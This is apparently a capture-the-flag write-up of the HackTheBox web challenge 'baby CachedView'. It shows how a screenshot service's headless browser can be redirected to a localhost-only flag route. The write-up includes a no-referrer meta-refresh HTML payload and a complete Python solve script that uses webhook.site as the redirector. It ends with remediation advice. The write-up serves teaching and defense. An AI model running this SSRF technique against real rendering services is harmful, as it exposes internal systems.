---
title: "baby CachedView"
date: 2027-05-06 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssrf, dns-rebinding, referer, headless-browser, no-referrer]
description: "An Easy Web challenge: a screenshot service runs a headless browser on localhost. A localhost-only flag route is reachable by getting that bot to follow a no-Referer meta-refresh redirect to 127.0.0.1, bypassing both the IP filter and the empty-Referer gate."
---

## Overview

**baby CachedView** is an Easy Web challenge. The app is a "cache/screenshot any
website" service: you submit a URL and a server-side headless **Firefox** (with
JavaScript disabled) navigates to it and saves a PNG. The flag lives at a
**localhost-only** route. The path to it is a [Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
against the service itself — make the on-box browser open `http://127.0.0.1/flag`
with no `Referer`, and it screenshots the secret for you.

## The technique

`GET /flag` returns the flag image only when **both** conditions hold:

```python
if request.remote_addr != '127.0.0.1' or request.referrer:
    abort(403)
```

So the request must originate from **localhost** *and* carry **no `Referer`**. You
can't hit `/flag` directly (you're remote), but the screenshot bot runs on the box
and connects via loopback — it satisfies `remote_addr == 127.0.0.1` for free.

There's a second guard on the cache endpoint. When you submit a URL it resolves the
hostname **once** and rejects internal ranges, so you can't just submit the loopback
URL:

```python
domain = urlparse(url).hostname
if is_inner_ipaddress(socket.gethostbyname(domain)):   # 127/8,10/8,172.16/12,192.168/16,0/8
    return 'IP not allowed'
bot.get(url)   # the headless browser then navigates here, following redirects
```

The whole game: get the bot to open `http://127.0.0.1/flag` **without a `Referer`**.

### Why the obvious tricks fail here

- **DNS rebinding** is the *intended* solution — the flag itself says so. You give a
  hostname that resolves to a public IP for the filter check, then to `127.0.0.1`
  for the browser's second lookup. But on this instance the container's DNS resolver
  **caches** the first (public) answer for the whole page load, so the browser gets
  the same public IP the validator saw and just hangs for the 10-second timeout. A
  single-record stateful flip (e.g. `1u.ms make-PUB-rebind-127.0.0.1-rr`) is served
  from that cache; a multi-record answer doesn't help because headless Firefox never
  fails over to the second A record inside the timeout. Rebinding needs the victim
  resolver to **re-query** — a cache kills it.
- **HTTPS→HTTP downgrade** would auto-strip the `Referer` (browsers drop it going from
  a secure to an insecure page), but the box can only egress plain **HTTP/80** — HTTPS
  is blocked, so tunnels like cloudflared/ngrok are unreachable.

## Solution

The IP filter only validates the **first** submitted host, not the redirect
destination — a classic *validate-here / fetch-there* gap. So submit a **public**
host (reachable over plain http/80) whose response redirects the bot to the flag with
no Referer. Two HTML tags do this even with **JavaScript disabled**:

```html
<meta name="referrer" content="no-referrer">
<meta http-equiv="refresh" content="0; url=http://127.0.0.1/flag">
```

`meta http-equiv="refresh"` navigates without JS; `meta name="referrer"
content="no-referrer"` strips the `Referer`. `webhook.site` is ideal: it answers over
**http/80** and lets you set the response body via its token API — no server of your
own needed.

Create `solve.py`:

```python
import sys, json, urllib.request

def post_json(url, obj, timeout=50):
    req = urllib.request.Request(url, data=json.dumps(obj).encode(),
                                 headers={'Content-Type': 'application/json'})
    return json.loads(urllib.request.urlopen(req, timeout=timeout).read())

box = sys.argv[1]   # TARGET:PORT

html = ('<meta name="referrer" content="no-referrer">'
        '<meta http-equiv="refresh" content="0; url=http://127.0.0.1/flag">')

tok = post_json('https://webhook.site/token',
                {'default_status': 200, 'default_content': html,
                 'default_content_type': 'text/html'})
redirector = f"http://webhook.site/{tok['uuid']}"

resp = post_json(f'http://{box}/api/cache', {'url': redirector})
fn = resp['filename']

png = urllib.request.urlopen(f'http://{box}/static/screenshots/{fn}').read()
open('flag.png', 'wb').write(png)
print('[+] flag screenshot saved -> flag.png')
```

Run it, then read the flag off the screenshot:

```bash
python3 solve.py TARGET:PORT   # -> flag.png renders HTB{...}
```

The captured screenshot shows the flag: `HTB{...}` (redacted).

## Why it worked

The IP filter validated the *public* redirector but never re-checked the *final*
localhost destination after the redirect. And `remote_addr == 127.0.0.1` plus
"no `Referer`" are not authentication — an on-box SSRF bot satisfies both trivially.
Because `meta refresh` and `meta referrer` are pure HTML, disabling JavaScript in the
screenshot browser did nothing to stop the redirect or the Referer suppression.

## Fix / defense

- Re-validate the destination **at fetch time**, after **every** redirect/refresh hop —
  resolve-and-pin and block private ranges in the renderer, not once on the submitted
  host.
- Don't authorize sensitive routes by `remote_addr`/loopback or the absence of a
  `Referer`; an on-box SSRF forges both. Require a real session token or secret.
- Run the headless browser in a network namespace with no route to loopback/internal
  services, and forbid it following redirects to private addresses.
